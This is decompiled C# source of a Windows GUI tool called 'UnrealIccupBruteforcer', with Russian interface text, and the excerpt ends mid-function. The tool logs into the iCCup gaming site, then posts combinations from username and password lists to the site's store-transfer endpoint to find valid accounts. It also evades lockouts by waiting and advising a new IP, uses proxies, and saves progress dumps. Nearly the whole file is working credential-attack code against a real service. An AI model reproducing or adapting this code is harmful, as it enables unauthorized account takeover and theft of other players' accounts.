// Decompiled with JetBrains decompiler
// Type: UnrealIccupBruteforcer.GForm0
// Assembly: UnrealIccupBruteforcer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E6E7BBA8-DFA2-4C69-A36D-873EA3E30432
// Assembly location: C:\Users\Karaulov\AppData\Roaming\Skype\My Skype Received Files\Brute[goshanvartanov].exe

using UnrealIccupBruteforcer;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace UnrealIccupBruteforcer
{
    public class AbsolBruter : Form
    {
        public static System.IO.Stream SoundStream = AllResources.bad_sound1;
        public static System.Media.SoundPlayer SoundPlayer = new System.Media.SoundPlayer(SoundStream);
        public const int WM_NCHITTEST = 132;
        public const int HTCLIENT = 1;
        public const int HTCAPTION = 2;
        public CookieContainer cookieContainer_0;
        public Bitmap exitbitmap;
        public Bitmap traybitmap;
        public Bitmap checkbitmap;
        public Bitmap bitmap_0;
        public Bitmap bitmap_1;
        public int CurPokeX;
        public Point mousemove;
        public bool mousedown;
        public bool checkedswapmode;
        public int latency;
        public bool loggedin;
        public bool checkbuttonneedenable;
        public int CurCount;
        public int CurTryCount;
        public List<string> usernameslist;
        public List<string> passwordslist;
        public int errorcount;
        public List<string> goodlist;
        public bool working;
        public bool pause;
        public WebProxy proxy;
        public PictureBox PokePictBox;
        public System.Windows.Forms.Timer PokeGoTimer;
        public PictureBox ExitButton;
        public PictureBox TrayButton;
        public TextBox BruteUsername;
        public TextBox BrutePassword;
        public PictureBox CheckButton;
        public Label label1;
        public Label label2;
        public Label label3;
        public PictureBox SwapMode;
        public Button UsernamesForBrute;
        public Button PasswordForBrute;
        public System.Windows.Forms.Timer SwapLoginTypeTimer;
        public TextBox SeparatorLP;
        public Label LabelM1;
        public Button LoadNickPwdSeperated;
        public Label LabelM3;
        public Label LabelM2;
        public Label label4;
        public Label label6;
        public Label UsersCount;
        public FuckListBox LogMyBox;
        public PictureBox BaseLoaded;
        public PictureBox LoginIccupGetted;
        public PictureBox RunnedBrute;
        public Label label7;
        public Label label8;
        public Label label9;
        public Label label10;
        public Label PcEnd;
        public Button PauseButton;
        public Button StartButton;
        public NotifyIcon BruTray;
        public IContainer components;
        public TextBox MyProxy;

        protected override void WndProc(ref Message message)
        {
            base.WndProc(ref message);
            if (message.Msg != 132 || (int)message.Result != 1)
                return;
            message.Result = (IntPtr)2;
        }

        public AbsolBruter()
        {

            cookieContainer_0 = new CookieContainer();
            exitbitmap = AllResources.ExitButton;
            traybitmap = AllResources.TrayBtn;
            checkbitmap = AllResources.CheckBtn;
            bitmap_0 = AllResources.MegoCheckBoxFirstpart;
            bitmap_1 = AllResources.MegoCheckBox;
            latency = 1000;
            checkbuttonneedenable = true;
            errorcount = 5;
            proxy = new WebProxy();
            try
            {
                InitializeComponent();
                mousemove = new Point();
                usernameslist = new List<string>();
                passwordslist = new List<string>();
                goodlist = new List<string>();
                SetStyle(ControlStyles.SupportsTransparentBackColor, true);
                exitbitmap = new Bitmap(ExitButton.BackgroundImage);
                traybitmap = new Bitmap(TrayButton.BackgroundImage);
                Bitmap bitmap = new Bitmap(bitmap_0.Width, bitmap_1.Height);
                using (Graphics graphics = Graphics.FromImage((Image)bitmap))
                {
                    graphics.Clear(Color.Transparent);
                    if (checkedswapmode)
                    {
                        graphics.DrawImage((Image)bitmap_0, 0, (unchecked(bitmap_1.Height / 2) - unchecked(bitmap_0.Height / 2)));
                        graphics.DrawImage((Image)bitmap_1, (bitmap_0.Width - bitmap_1.Width), 0);
                    }
                    else
                    {
                        graphics.DrawImage((Image)bitmap_0, 0, (unchecked(bitmap_1.Height / 2) - unchecked(bitmap_0.Height / 2)));
                        graphics.DrawImage((Image)bitmap_1, 0, 0);
                    }
                }
                SwapMode.BackgroundImage = (Image)bitmap;
            }
            catch
            {
            }

            SoundPlayer.Play();
        }

        public void PokeGoTimer_Tick(object sender, EventArgs e)
        {
            LogMyBox.Refresh();
            Bitmap bitmap = new Bitmap(AllResources.PokeLine.Width, AllResources.PokeLine.Height);
            using (Graphics graphics = Graphics.FromImage((Image)bitmap))
            {
                graphics.DrawImage((Image)AllResources.PokeLine, CurPokeX, 0, AllResources.PokeLine.Width, AllResources.PokeLine.Height);
                graphics.DrawImage((Image)AllResources.PokeLine, (CurPokeX + AllResources.PokeLine.Width), 0, AllResources.PokeLine.Width, AllResources.PokeLine.Height);
            }
             { CurPokeX -= 1; }
            if (CurPokeX < (-AllResources.PokeLine.Width))
                CurPokeX = 0;
            if (CurPokeX > AllResources.PokeLine.Width)
                CurPokeX = 0;
            PokePictBox.Image = (Image)bitmap;
        }

        public void ExitButtonUpdate(int need)
        {
            if (need == 1)
                ExitButton.BackgroundImage = (Image)new Bitmap((Image)exitbitmap, new Size((exitbitmap.Width + 5), (exitbitmap.Height + 5)));
            else if (need == 2)
                ExitButton.BackgroundImage = (Image)new Bitmap((Image)exitbitmap, new Size((exitbitmap.Width - 5), (exitbitmap.Height - 5)));
            else
                ExitButton.BackgroundImage = (Image)new Bitmap((Image)exitbitmap);
        }

        public void ExitButton_MouseEnter(object sender, EventArgs e)
        {
            ExitButtonUpdate(1);
        }

        public void ExitButton_MouseLeave(object sender, EventArgs e)
        {
            ExitButtonUpdate(0);
        }

        public void ExitButton_MouseDown(object sender, MouseEventArgs e)
        {
            ExitButtonUpdate(2);
        }

        public void ExitButton_MouseUp(object sender, MouseEventArgs e)
        {
            ExitButtonUpdate(1);
        }

        public void TrayButtonUpdate(int need)
        {
            if (need == 1)
                TrayButton.BackgroundImage = (Image)new Bitmap((Image)traybitmap, new Size((traybitmap.Width + 5), (traybitmap.Height + 5)));
            else if (need == 2)
                TrayButton.BackgroundImage = (Image)new Bitmap((Image)traybitmap, new Size((traybitmap.Width - 5), (traybitmap.Height - 5)));
            else
                TrayButton.BackgroundImage = (Image)new Bitmap((Image)traybitmap);
        }

        public void TrayButton_MouseDown(object sender, MouseEventArgs e)
        {
            TrayButtonUpdate(2);
        }

        public void TrayButton_MouseUp(object sender, MouseEventArgs e)
        {
            TrayButtonUpdate(1);
        }

        public void TrayButton_MouseEnter(object sender, EventArgs e)
        {
            TrayButtonUpdate(1);
        }

        public void TrayButton_MouseLeave(object sender, EventArgs e)
        {
            TrayButtonUpdate(0);
        }

        public void ExitButton_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
            Application.Exit();
        }

        public void AbsolFreeBrut3Force_Load(object sender, EventArgs e)
        {
            new Thread(new ThreadStart(SendHardwareId)).Start();
            if (System.IO.File.Exists("lastlogin.txt"))
                BruteUsername.Text = System.IO.File.ReadAllText("lastlogin.txt");
            if (!System.IO.File.Exists("lastpwd.txt"))
                return;
            BrutePassword.Text = System.IO.File.ReadAllText("lastpwd.txt");
        }

        public void SwapMode_MouseDown(object sender, MouseEventArgs e)
        {
            mousemove = new Point(SwapMode.PointToClient(Control.MousePosition).X, SwapMode.PointToClient(Control.MousePosition).Y);
            mousedown = true;
        }

        public void SwapMode_MouseUp(object sender, MouseEventArgs e)
        {
            if (!mousedown)
                return;
            mousedown = false;
            if ((mousemove.X + 5) > SwapMode.PointToClient(Control.MousePosition).X && (mousemove.X - 5) < SwapMode.PointToClient(Control.MousePosition).X && ((mousemove.Y + 5) > SwapMode.PointToClient(Control.MousePosition).Y && (mousemove.Y - 5) < SwapMode.PointToClient(Control.MousePosition).Y) || Math.Abs((SwapMode.PointToClient(Control.MousePosition).X - mousemove.X)) < bitmap_0.Height / 2)
                return;
            checkedswapmode = (SwapMode.PointToClient(Control.MousePosition).X - mousemove.X - unchecked(bitmap_0.Height / 2)) > 0;
            Bitmap bitmap = new Bitmap(bitmap_0.Width, bitmap_1.Height);
            using (Graphics graphics = Graphics.FromImage((Image)bitmap))
            {
                graphics.Clear(Color.Transparent);
                if (checkedswapmode)
                {
                    graphics.DrawImage((Image)bitmap_0, 0, (unchecked(bitmap_1.Height / 2) - unchecked(bitmap_0.Height / 2)));
                    graphics.DrawImage((Image)bitmap_1, (bitmap_0.Width - bitmap_1.Width), 0);
                }
                else
                {
                    graphics.DrawImage((Image)bitmap_0, 0, (unchecked(bitmap_1.Height / 2) - unchecked(bitmap_0.Height / 2)));
                    graphics.DrawImage((Image)bitmap_1, 0, 0);
                }
            }
            SwapMode.BackgroundImage = (Image)bitmap;
        }

        public void SwapMode_Click(object sender, EventArgs e)
        {
            if ((mousemove.X + 5) <= SwapMode.PointToClient(Control.MousePosition).X || (mousemove.X - 5) >= SwapMode.PointToClient(Control.MousePosition).X || ((mousemove.Y + 5) <= SwapMode.PointToClient(Control.MousePosition).Y || (mousemove.Y - 5) >= SwapMode.PointToClient(Control.MousePosition).Y))
                return;
            Bitmap bitmap = new Bitmap(bitmap_0.Width, bitmap_1.Height);
            using (Graphics graphics = Graphics.FromImage((Image)bitmap))
            {
                graphics.Clear(Color.Transparent);
                if (!checkedswapmode)
                {
                    checkedswapmode = true;
                    graphics.DrawImage((Image)bitmap_0, 0, (unchecked(bitmap_1.Height / 2) - unchecked(bitmap_0.Height / 2)));
                    graphics.DrawImage((Image)bitmap_1, (bitmap_0.Width - bitmap_1.Width), 0);
                }
                else
                {
                    checkedswapmode = false;
                    graphics.DrawImage((Image)bitmap_0, 0, (unchecked(bitmap_1.Height / 2) - unchecked(bitmap_0.Height / 2)));
                    graphics.DrawImage((Image)bitmap_1, 0, 0);
                }
            }
            SwapMode.BackgroundImage = (Image)bitmap;
        }

        public void SwapMode_DragEnter(object sender, DragEventArgs e)
        {
        }

        public void SwapMode_MouseMove(object sender, MouseEventArgs e)
        {
            if (!mousedown)
                return;
            Bitmap bitmap1 = new Bitmap(bitmap_0.Width, bitmap_1.Height);
            using (Graphics graphics = Graphics.FromImage((Image)bitmap1))
            {
                graphics.Clear(Color.Transparent);
                checkedswapmode = true;
                graphics.DrawImage((Image)bitmap_0, 0, (unchecked(bitmap_1.Height / 2) - unchecked(bitmap_0.Height / 2)));
                graphics.DrawImage((Image)bitmap_1, (SwapMode.PointToClient(Control.MousePosition).X - unchecked(bitmap_1.Height / 2) - 10), 0);
            }
            SwapMode.BackgroundImage = (Image)bitmap1;
            if ((SwapMode.PointToClient(Control.MousePosition).X - unchecked(bitmap_1.Height / 2)) >= 0 && (SwapMode.PointToClient(Control.MousePosition).X - unchecked(bitmap_1.Height / 2) - 10) <= (bitmap_0.Width - 60))
                return;
            mousedown = false;
            if (Math.Abs((SwapMode.PointToClient(Control.MousePosition).X - mousemove.X)) < bitmap_0.Height / 2)
                return;
            checkedswapmode = (SwapMode.PointToClient(Control.MousePosition).X - mousemove.X - unchecked(bitmap_0.Height / 2)) > 0;
            Bitmap bitmap2 = new Bitmap(bitmap_0.Width, bitmap_1.Height);
            using (Graphics graphics = Graphics.FromImage((Image)bitmap2))
            {
                graphics.Clear(Color.Transparent);
                if (checkedswapmode)
                {
                    graphics.DrawImage((Image)bitmap_0, 0, (unchecked(bitmap_1.Height / 2) - unchecked(bitmap_0.Height / 2)));
                    graphics.DrawImage((Image)bitmap_1, (bitmap_0.Width - bitmap_1.Width), 0);
                }
                else
                {
                    graphics.DrawImage((Image)bitmap_0, 0, (unchecked(bitmap_1.Height / 2) - unchecked(bitmap_0.Height / 2)));
                    graphics.DrawImage((Image)bitmap_1, 0, 0);
                }
            }
            SwapMode.BackgroundImage = (Image)bitmap2;
        }

        public void SwapMode_MouseLeave(object sender, EventArgs e)
        {
            if (!mousedown)
                return;
            mousedown = false;
            if (Math.Abs((SwapMode.PointToClient(Control.MousePosition).X - mousemove.X)) <= bitmap_0.Height / 2)
                return;
            checkedswapmode = (unchecked(bitmap_0.Height / 2) - SwapMode.PointToClient(Control.MousePosition).X - mousemove.X) < 0;
            Bitmap bitmap = new Bitmap(bitmap_0.Width, bitmap_1.Height);
            using (Graphics graphics = Graphics.FromImage((Image)bitmap))
            {
                graphics.Clear(Color.Transparent);
                if (checkedswapmode)
                {
                    graphics.DrawImage((Image)bitmap_0, 0, (unchecked(bitmap_1.Height / 2) - unchecked(bitmap_0.Height / 2)));
                    graphics.DrawImage((Image)bitmap_1, (bitmap_0.Width - bitmap_1.Width), 0);
                }
                else
                {
                    graphics.DrawImage((Image)bitmap_0, 0, (unchecked(bitmap_1.Height / 2) - unchecked(bitmap_0.Height / 2)));
                    graphics.DrawImage((Image)bitmap_1, 0, 0);
                }
            }
            SwapMode.BackgroundImage = (Image)bitmap;
        }

        public void SwapMode_MouseEnter(object sender, EventArgs e)
        {
            mousemove = SwapMode.PointToClient(Control.MousePosition);
        }

        public void CheckButtonUpdate(int need)
        {
            if (need == 1)
            {
                CheckButton.BackgroundImage = (Image)null;
                CheckButton.BackgroundImage = (Image)new Bitmap((Image)checkbitmap, new Size((checkbitmap.Width + 5), (checkbitmap.Height + 5)));
            }
            else if (need == 2)
            {
                CheckButton.BackgroundImage = (Image)null;
                CheckButton.BackgroundImage = (Image)new Bitmap((Image)checkbitmap, new Size((checkbitmap.Width - 5), (checkbitmap.Height - 5)));
            }
            else
            {
                CheckButton.BackgroundImage = (Image)null;
                CheckButton.BackgroundImage = (Image)new Bitmap((Image)checkbitmap);
            }
        }

        public void CheckButton_MouseEnter(object sender, EventArgs e)
        {
            CheckButtonUpdate(1);
        }

        public void CheckButton_MouseLeave(object sender, EventArgs e)
        {
            CheckButtonUpdate(0);
        }

        public void CheckButton_MouseDown(object sender, MouseEventArgs e)
        {
            CheckButtonUpdate(2);
        }

        public void CheckButton_MouseUp(object sender, MouseEventArgs e)
        {
            CheckButtonUpdate(1);
        }

        public void SetLoginAndStartLatency()
        {
            if (!IsAllOkay())
            {
                AddLogBoxItem("Все плохо!");
                checkbuttonneedenable = true;
            }
            else
            {
                string text1 = BruteUsername.Text;
                string text2 = BrutePassword.Text;
                cookieContainer_0 = new CookieContainer();
                DateTime now = DateTime.Now;
                try
                {
                    HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://iccup.com/login/gologin.html");
                    httpWebRequest.Method = "POST";
                    httpWebRequest.Referer = "https://iccup.com/login.html";
                    httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2334.0 Safari/537.36";
                    httpWebRequest.ServicePoint.Expect100Continue = false;
                    httpWebRequest.ContentType = "keep-alive";
                    httpWebRequest.CookieContainer = cookieContainer_0;
                    httpWebRequest.Proxy = (IWebProxy)proxy;
                    httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                    httpWebRequest.Headers["Origin"] = "https://iccup.com";
                    httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                    byte[] bytes = Encoding.UTF8.GetBytes("login=" + text1 + "&passw=" + text2 + "&dologin=%D0%A1%D0%B5%D0%B7%D0%B0%D0%BC%2C+%D0%BE%D1%82%D0%BA%D1%80%D0%BE%D0%B9%D1%81%D1%8F%21");
                    httpWebRequest.ContentLength = (long)bytes.Length;
                    Stream requestStream = httpWebRequest.GetRequestStream();
                    requestStream.Write(bytes, 0, bytes.Length);
                    requestStream.Close();
                    HttpWebResponse response = (HttpWebResponse)httpWebRequest.GetResponse();
                    new StreamReader(response.GetResponseStream()).ReadToEnd();
                    cookieContainer_0.Add(response.Cookies);
                }
                catch
                {
                    loggedin = false;
                    latency = 1000;
                    AddLogBoxItem("Ошибка получения логина, ждать 20 сек!");
                    checkbuttonneedenable = true;
                    return;
                }
                Hashtable hashtable = (Hashtable)cookieContainer_0.GetType().InvokeMember("m_domainTable", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.GetField, (Binder)null, (object)cookieContainer_0, new object[0]);
                loggedin = false;
                foreach (string key in (IEnumerable)hashtable.Keys)
                {
                    string str = key;
                    if (str != null)
                    {
                        if ((int)str[0] == 46)
                            str = str.Remove(0, 1);
                        foreach (Cookie cookie in cookieContainer_0.GetCookies(new Uri(string.Format("https://{0}/", (object)str))))
                        {
                            if (cookie.Name.IndexOf("last") > -1)
                                loggedin = true;
                        }
                    }
                }
                latency = ((int)(DateTime.Now - now).TotalMilliseconds);
                checkbuttonneedenable = true;
            }
        }

        public void CheckButton_Click(object sender, EventArgs e)
        {
            checkbuttonneedenable = false;
            SetLoginAndStartLatency();
        }

        public void SwapLoginTypeTimer_Tick(object sender, EventArgs e)
        {
            if (AbsolBruter.GlobalVars.BruteBase.Count > 0)
            {
                int count = AbsolBruter.GlobalVars.BruteBase.Count;
                int num = 0;
                int index = 0;
                while (index < AbsolBruter.GlobalVars.BruteBase.Count)
                {
                    if (AbsolBruter.GlobalVars.BruteBase[index].Requested)
                         { ++num; }
                     { ++index; }
                }
                PcEnd.Text = Convert.ToInt32(Convert.ToDouble(num) / Convert.ToDouble(count) * Convert.ToDouble(100)).ToString() + "%";
            }
            else
                PcEnd.Text = "0%";
            if (checkbuttonneedenable)
                CheckButton.Enabled = true;
            else
                CheckButton.Enabled = false;
            if (working && !pause)
                RunnedBrute.BackgroundImage = (Image)AllResources.okay;
            else
                RunnedBrute.BackgroundImage = (Image)AllResources.Bad;
            UsersCount.Text = CurCount.ToString() + " из " + AbsolBruter.GlobalVars.BruteBase.Count.ToString() + " (" + CurTryCount.ToString() + ")";
            if (AbsolBruter.GlobalVars.BruteBase.Count > 0)
                BaseLoaded.BackgroundImage = (Image)AllResources.okay;
            else
                BaseLoaded.BackgroundImage = (Image)AllResources.Bad;
            if (loggedin)
                LoginIccupGetted.BackgroundImage = (Image)AllResources.okay;
            else
                LoginIccupGetted.BackgroundImage = (Image)AllResources.Bad;
            if (checkedswapmode)
            {
                UsernamesForBrute.Visible = false;
                PasswordForBrute.Visible = false;
                LabelM1.Visible = true;
                LabelM2.Visible = true;
                LabelM3.Visible = true;
                LoadNickPwdSeperated.Visible = true;
                SeparatorLP.Visible = true;
            }
            else
            {
                UsernamesForBrute.Visible = true;
                PasswordForBrute.Visible = true;
                LabelM1.Visible = false;
                LabelM2.Visible = false;
                LabelM3.Visible = false;
                LoadNickPwdSeperated.Visible = false;
                SeparatorLP.Visible = false;
            }
        }

        public void AddLogBoxItem(string item)
        {
            if (!System.IO.File.Exists("logfile.log"))
                System.IO.File.Create("logfile.log").Close();
            System.IO.File.WriteAllLines("logfile.log", new List<string>((IEnumerable<string>)System.IO.File.ReadAllLines("logfile.log"))
      {
        item
      }.ToArray());

            LogMyBox.Invoke(new Action(() => LogMyBox.Items.Insert(3, (object)item)));
        }

        public void TrayButton_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        public string[] getdata(string data)
        {
            return data.Split(new string[1]
            {
        SeparatorLP.Text
            }, StringSplitOptions.None);
        }

        public void LoadNickPwdSeperated_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "USERNAME : PASSWOD List|*.*";
            openFileDialog.Multiselect = false;
            if (openFileDialog.ShowDialog() != DialogResult.OK)
                return;
            string[] strArray = System.IO.File.ReadAllLines(openFileDialog.FileName);
            AbsolBruter.GlobalVars.BruteBase.Clear();
            int index = 0;
            while (index < strArray.Length)
            {
                try
                {
                    if (getdata(strArray[index])[1].Length > 5)
                    {
                        if (getdata(strArray[index])[1].Length < 16)
                        {
                            if (getdata(strArray[index])[0].Length > 2)
                            {
                                if (getdata(strArray[index])[0].Length < 13)
                                {
                                    AbsolBruter.GlobalVars.BruteBaseStruct bruteBaseStruct = new AbsolBruter.GlobalVars.BruteBaseStruct(getdata(strArray[index])[0], getdata(strArray[index])[1], false);
                                    AbsolBruter.GlobalVars.BruteBase.Add(bruteBaseStruct);
                                }
                            }
                        }
                    }
                }
                catch
                {
                    AddLogBoxItem("Ошибка чтения файла username:password !");
                }
                 { ++index; }
            }
        }

        public void AbsolFreeBrut3Force_Resize(object sender, EventArgs e)
        {
            if (FormWindowState.Minimized == WindowState)
            {
                BruTray.Visible = true;
                BruTray.ShowBalloonTip(500);
                Visible = false;
            }
            else
            {
                if (WindowState != FormWindowState.Normal)
                    return;
                BruTray.Visible = false;
                Visible = true;
            }
        }

        public void BruTray_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            Visible = true;
            WindowState = FormWindowState.Normal;
        }

        public void UsernamesForBrute_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Username List|*.*";
            openFileDialog.Multiselect = false;
            if (openFileDialog.ShowDialog() != DialogResult.OK)
                return;
            string[] strArray = System.IO.File.ReadAllLines(openFileDialog.FileName);
            usernameslist.Clear();
            int index1 = 0;
            while (index1 < strArray.Length)
            {
                if (strArray[index1].Length > 2 && strArray[index1].Length < 16)
                    usernameslist.Add(strArray[index1]);
                 { ++index1; }
            }
            if (passwordslist.Count <= 0 || usernameslist.Count <= 0)
                return;
            AbsolBruter.GlobalVars.BruteBase.Clear();
            int index2 = 0;
            while (index2 < passwordslist.Count)
            {
                int index3 = 0;
                while (index3 < usernameslist.Count)
                {
                    AbsolBruter.GlobalVars.BruteBaseStruct bruteBaseStruct = new AbsolBruter.GlobalVars.BruteBaseStruct(usernameslist[index3], passwordslist[index2], false);
                    AbsolBruter.GlobalVars.BruteBase.Add(bruteBaseStruct);
                     { ++index3; }
                }
                 { ++index2; }
            }
        }

        public void PasswordForBrute_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Passwords List|*.*";
            openFileDialog.Multiselect = false;
            if (openFileDialog.ShowDialog() != DialogResult.OK)
                return;
            string[] strArray = System.IO.File.ReadAllLines(openFileDialog.FileName);
            passwordslist.Clear();
            int index1 = 0;
            while (index1 < strArray.Length)
            {
                if (strArray[index1].Length > 5 && strArray[index1].Length < 13)
                    passwordslist.Add(strArray[index1]);
                 { ++index1; }
            }
            if (passwordslist.Count <= 0 || usernameslist.Count <= 0)
                return;
            AbsolBruter.GlobalVars.BruteBase.Clear();
            int index2 = 0;
            while (index2 < passwordslist.Count)
            {
                int index3 = 0;
                while (index3 < usernameslist.Count)
                {
                    AbsolBruter.GlobalVars.BruteBaseStruct bruteBaseStruct = new AbsolBruter.GlobalVars.BruteBaseStruct(usernameslist[index3], passwordslist[index2], false);
                    AbsolBruter.GlobalVars.BruteBase.Add(bruteBaseStruct);
                     { ++index3; }
                }
                 { ++index2; }
            }
        }

        public static string identifier(string wmiClass, string wmiProperty)
        {
            string str = "";
            foreach (ManagementObject instance in new ManagementClass(wmiClass).GetInstances())
            {
                if (str == "")
                {
                    try
                    {
                        str = instance[wmiProperty].ToString();
                        break;
                    }
                    catch
                    {
                    }
                }
            }
            return str;
        }

        public static string cpuId()
        {
            string str1 = AbsolBruter.identifier("Win32_Processor", "UniqueId");
            if (str1 == "")
            {
                str1 = AbsolBruter.identifier("Win32_Processor", "ProcessorId");
                if (str1 == "")
                {
                    string str2 = AbsolBruter.identifier("Win32_Processor", "Name");
                    if (str2 == "")
                        str2 = AbsolBruter.identifier("Win32_Processor", "Manufacturer");
                    str1 = str2 + AbsolBruter.identifier("Win32_Processor", "MaxClockSpeed");
                }
            }
            return str1;
        }

        public string GetUserName()
        {
            string str = "-EMANON-";
            try
            {
                str = WindowsIdentity.GetCurrent().Name;
            }
            catch
            {
            }
            return str;
        }

        public static string ReverseStr(string s)
        {
            char[] charArray = s.ToCharArray();
            Array.Reverse((Array)charArray);
            return new string(charArray);
        }

        public void SendHardwareId()
        {
            Thread.Sleep(3000);
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool FreeLibrary(IntPtr hModule);

        public bool IsAllOkay()
        {
            return true;
        }

        public bool CheckProxy(WebProxy proxy)
        {
            try
            {
                HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://iccup.com");
                httpWebRequest.Method = "POST";
                httpWebRequest.Referer = "https://iccup.com";
                httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2334.0 Safari/537.36";
                httpWebRequest.CookieContainer = new CookieContainer();
                httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                httpWebRequest.Timeout = 3000;
                httpWebRequest.Proxy = (IWebProxy)proxy;
                string str = "                                          ";
                StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream());
                streamWriter.Write(str);
                streamWriter.Close();
                HttpWebResponse response = (HttpWebResponse)httpWebRequest.GetResponse();
                StreamReader streamReader = new StreamReader(response.GetResponseStream());
                streamReader.ReadToEnd();
                if (httpWebRequest.CookieContainer.Count > 0 && response.StatusCode == HttpStatusCode.OK)
                {
                    response.Close();
                    streamReader.Close();
                    return true;
                }
                response.Close();
                streamReader.Close();
                return false;
            }
            catch
            {
            }
            return false;
        }

        public void SingleThreadBruter()
        {
            string str1 = "";
            string str2 = "";
            working = true;
            int num1 = 100;
            int num2 = 10;
            int index1 = 0;
            while (index1 < AbsolBruter.GlobalVars.BruteBase.Count)
            {
                while (!AbsolBruter.GlobalVars.BruteBase[index1].Requested)
                {
                     { ++CurTryCount; }
                     { --num1; }
                    if (!loggedin)
                    {
                        AddLogBoxItem("Жду 20 сек и пробую снова.");
                        Thread.Sleep(100);
                        AddLogBoxItem("перезапустите модем.(нужен новый IP)");
                        Thread.Sleep(100);
                        AddLogBoxItem("Введите новый iCCup логин или");
                        Thread.Sleep(100);
                        AddLogBoxItem("Возможно появилась капча.");
                        Thread.Sleep(100);
                        AddLogBoxItem("Ваш iCCup логин не действителен!");
                        Thread.Sleep(20000);
                        checkbuttonneedenable = false;
                        SetLoginAndStartLatency();
                    }
                    else
                    {
                        if (num1 < 0)
                        {
                            num1 = 98;
                             { --num2; }
                            if (num2 < 0)
                            {
                                num2 = 10;
                                string path = "LastBruteDataDump.txt";
                                if (!System.IO.File.Exists(path))
                                {
                                    System.IO.File.Create(path).Close();
                                }
                                else
                                {
                                    System.IO.File.Delete(path);
                                    System.IO.File.Create(path).Close();
                                }
                                List<string> stringList = new List<string>();
                                int index2 = 0;
                                while (index2 < AbsolBruter.GlobalVars.BruteBase.Count)
                                {
                                    if (!AbsolBruter.GlobalVars.BruteBase[index2].Requested)
                                        stringList.Add(AbsolBruter.GlobalVars.BruteBase[index2].username + SeparatorLP.Text + AbsolBruter.GlobalVars.BruteBase[index2].password);
                                     { ++index2; }
                                }
                                System.IO.File.WriteAllLines(path, stringList.ToArray());
                            }
                            Thread.Sleep((2500 + new Random().Next(1, 1000)));
                        }
                        while (pause)
                            Thread.Sleep(500);
                        pause = true;
                        while (!IsAllOkay())
                        {
                            pause = true;
                            Thread.Sleep(5000);
                        }
                        pause = false;
                        string username = AbsolBruter.GlobalVars.BruteBase[index1].username;
                        string password = AbsolBruter.GlobalVars.BruteBase[index1].password;
                        string end;
                        Uri responseUri;
                        try
                        {
                            HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://iccup.com/store/buyItem/19/final/");
                            httpWebRequest.Method = "POST";
                            httpWebRequest.Referer = "https://iccup.com/store/buyItem/19/step1.html";
                            httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2334.0 Safari/537.36";
                            httpWebRequest.CookieContainer = cookieContainer_0;
                            httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                            httpWebRequest.Headers.Add("Accept-Encoding", "gzip, deflate");
                            httpWebRequest.Headers.Add("Origin", "https://iccup.com");
                            httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");

                            string str3 = "ladder=5&nickname=" + username + "&password=" + password;
                            httpWebRequest.ReadWriteTimeout = 5000;
                            httpWebRequest.Timeout = 5000;
                            httpWebRequest.Proxy = (IWebProxy)proxy;
                            StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream());
                            streamWriter.Write(str3);
                            streamWriter.Close();
                            HttpWebResponse response = (HttpWebResponse)httpWebRequest.GetResponse();
                            Stream responseStream = response.GetResponseStream();
                            StreamReader streamReader = new StreamReader(responseStream);
                            end = streamReader.ReadToEnd();
                            streamReader.Close();
                            responseStream.Close();
                            responseUri = response.ResponseUri;
                            response.Close();
                        }
                        catch (WebException ex)
                        {
                            AddLogBoxItem("Bad request. " + ex.Message);
                            AddLogBoxItem("Sleep 20000 sec and start.");
                            Thread.Sleep(20000);
                            checkbuttonneedenable = false;
                            SetLoginAndStartLatency();
                            continue;
                        }
                        catch
                        {
                            AddLogBoxItem("Bad request.");
                            AddLogBoxItem(" Username:" + username + ", Password:" + password);
                            AddLogBoxItem("Sleep 10000 sec and start.");
                            Thread.Sleep(10000);
                            checkbuttonneedenable = false;
                            SetLoginAndStartLatency();
                            continue;
                        }
                        try
                        {
                            if (end != null && !(responseUri == (Uri)null) && (end.Length >= 200 && responseUri.AbsolutePath != null))
                            {
                                 { ++CurCount; }
                                if (end.IndexOf("S_checkmark.jpg") <= 0 && end.IndexOf("transfer-attention") <= 0 && responseUri.AbsolutePath.IndexOf("category/6") <= 0)
                                {
                                    if (responseUri.AbsolutePath.IndexOf("success") <= 0)
                                        goto label_58;
                                }
                                bool flag1 = end.IndexOf("transfer-attention") > 0;
                                string empty = string.Empty;
                                if (end.IndexOf("S_checkmark.jpg") > 0)
                                    empty += "1";
                                if (end.IndexOf("transfer-attention") > 0)
                                    empty += "2";
                                if (responseUri.AbsolutePath.IndexOf("category/6") > 0)
                                    empty += "3";
                                if (responseUri.AbsolutePath.IndexOf("success") > 0)
